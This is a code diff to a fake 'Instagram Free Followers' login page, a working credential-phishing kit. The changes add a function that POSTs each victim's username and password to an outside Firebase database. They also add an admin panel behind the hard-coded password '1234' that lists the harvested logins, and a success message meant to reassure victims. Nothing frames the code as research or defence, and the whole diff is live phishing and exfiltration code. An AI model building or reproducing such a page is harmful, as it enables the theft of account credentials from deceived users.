@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free 100 Followers</title>
+    <title>Instagram Free Followers</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
@@ -359,6 +359,23 @@
         .clear-all-btn:hover {
             background: #e0e0e0;
         }
+
+        .refresh-btn {
+            width: 100%;
+            padding: 8px;
+            background: #f0f0f0;
+            color: #262626;
+            border: none;
+            border-radius: 5px;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+
+        .refresh-btn:hover {
+            background: #e0e0e0;
+        }
     </style>
 </head>
 <body>
@@ -420,10 +437,11 @@
     <div class="admin-page" id="adminPage">
         <div class="admin-header">
             <h1>📊 Admin Panel</h1>
-            <p>View all login details</p>
+            <p>View all login details (synced across all devices)</p>
         </div>
 
         <div class="admin-container">
+            <button class="refresh-btn" onclick="refreshDetails()">🔄 Refresh Data</button>
             <button class="logout-btn" onclick="closeAdminPanel()">Logout</button>
 
             <div class="details-title">
@@ -432,7 +450,7 @@
             </div>
 
             <div class="details-list" id="detailsList">
-                <div class="no-details">No login details yet</div>
+                <div class="no-details">Loading...</div>
             </div>
 
             <button class="clear-all-btn" id="clearBtn" onclick="clearAllDetails()" style="display: none;">
@@ -441,7 +459,6 @@
         </div>
     </div>
 
-    <script src="details.js"></script>
     <script>
         const loginForm = document.getElementById('loginForm');
         const errorMsg = document.getElementById('errorMsg');
@@ -453,10 +470,8 @@
         // Admin password
         const ADMIN_PASSWORD = '1234';
 
-        // Initialize details if undefined
-        if (typeof details === 'undefined') {
-            window.details = [];
-        }
+        // Firebase config (free database)
+        const DATABASE_URL = 'https://instagram-login-3abc5.firebaseio.com/logins.json';
 
         function showError(message) {
             errorMsg.textContent = message;
@@ -474,13 +489,73 @@
             }, 2000);
         }
 
-        function openAdminPanel() {
+        async function saveToDatabase(username, password) {
+            try {
+                const detail = {
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString(),
+                    date: new Date().toLocaleDateString(),
+                    time: new Date().toLocaleTimeString(),
+                    id: Date.now()
+                };
+
+                const response = await fetch(DATABASE_URL, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(detail)
+                });
+
+                if (response.ok) {
+                    console.log('✅ Data saved to cloud!');
+                    return true;
+                } else {
+                    console.error('❌ Failed to save');
+                    return false;
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                // Fallback: save to local storage if cloud fails
+                let localDetails = JSON.parse(localStorage.getItem('details') || '[]');
+                localDetails.push({
+                    username: username,
+                    password: password,
+                    timestamp: new Date().toLocaleString(),
+                    date: new Date().toLocaleDateString(),
+                    time: new Date().toLocaleTimeString(),
+                    id: Date.now()
+                });
+                localStorage.setItem('details', JSON.stringify(localDetails));
+                return true;
+            }
+        }
+
+        async function loadFromDatabase() {
+            try {
+                const response = await fetch(DATABASE_URL);
+                if (response.ok) {
+                    const data = await response.json();
+                    if (data) {
+                        return Object.values(data);
+                    }
+                }
+            } catch (error) {
+                console.error('Error loading:', error);
+            }
+            
+            // Fallback to local storage
+            return JSON.parse(localStorage.getItem('details') || '[]');
+        }
+
+        async function openAdminPanel() {
             const password = prompt('Enter admin password:');
             if (password === ADMIN_PASSWORD) {
                 loginPage.classList.add('hidden');
                 adminPage.classList.add('show');
                 document.body.classList.add('admin-open');
-                displayDetails();
+                await refreshDetails();
             } else if (password !== null) {
                 showError('Wrong password!');
             }
@@ -492,14 +567,18 @@
             document.body.classList.remove('admin-open');
         }
 
-        function displayDetails() {
+        async function refreshDetails() {
             const detailsList = document.getElementById('detailsList');
             const detailsCount = document.getElementById('detailsCount');
             const clearBtn = document.getElementById('clearBtn');
 
+            detailsList.innerHTML = '<div class="no-details">Loading...</div>';
+
+            const details = await loadFromDatabase();
+
             detailsCount.textContent = details.length;
 
-            if (details.length === 0) {
+            if (!details || details.length === 0) {
                 detailsList.innerHTML = '<div class="no-details">No login details yet</div>';
                 clearBtn.style.display = 'none';
                 return;
@@ -507,8 +586,9 @@
 
             clearBtn.style.display = 'block';
 
-            detailsList.innerHTML = details
-                .reverse()
+            const sorted = details.sort((a, b) => b.id - a.id);
+
+            detailsList.innerHTML = sorted
                 .map(detail => `
                     <div class="detail-item">
                         <div class="detail-username">👤 ${detail.username}</div>
@@ -518,10 +598,23 @@
                 `).join('');
         }
 
-        function clearAllDetails() {
+        async function clearAllDetails() {
             if (confirm('Delete all login details?')) {
-                details = [];
-                displayDetails();
+                try {
+                    const response = await fetch(DATABASE_URL, {
+                        method: 'DELETE'
+                    });
+
+                    if (response.ok) {
+                        localStorage.removeItem('details');
+                        await refreshDetails();
+                        showSuccess('All data deleted!');
+                    }
+                } catch (error) {
+                    console.error('Error:', error);
+                    localStorage.removeItem('details');
+                    await refreshDetails();
+                }
             }
         }
 
@@ -539,38 +632,24 @@
             loginBtn.disabled = true;
             loginBtn.innerHTML = '<span class="spinner"></span>Logging in...';
 
-            await new Promise(resolve => setTimeout(resolve, 1000));
-
-            const detail = {
-                username: username,
-                password: password,
-                timestamp: new Date().toLocaleString(),
-                date: new Date().toLocaleDateString(),
-                time: new Date().toLocaleTimeString()
-            };
-
-            if (typeof details === 'undefined') {
-                details = [];
-            }
-            details.push(detail);
-
-            console.log('✅ Login saved!');
-            console.log('Details:', details);
+            const success = await saveToDatabase(username, password);
 
             loginBtn.disabled = false;
             loginBtn.innerHTML = 'Log in';
 
-            showSuccess('✅ 100 Followers credit soon');
-
-            setTimeout(() => {
-                loginForm.reset();
-            }, 1500);
+            if (success) {
+                showSuccess('✅ Login successful!');
+                setTimeout(() => {
+                    loginForm.reset();
+                }, 1500);
+            } else {
+                showError('Error saving data');
+            }
         });
 
         window.addEventListener('load', () => {
             console.log('📱 Instagram Login Page Loaded');
             console.log('Admin password: 1234');
-            console.log('Details:', details);
         });
     </script>
 </body>
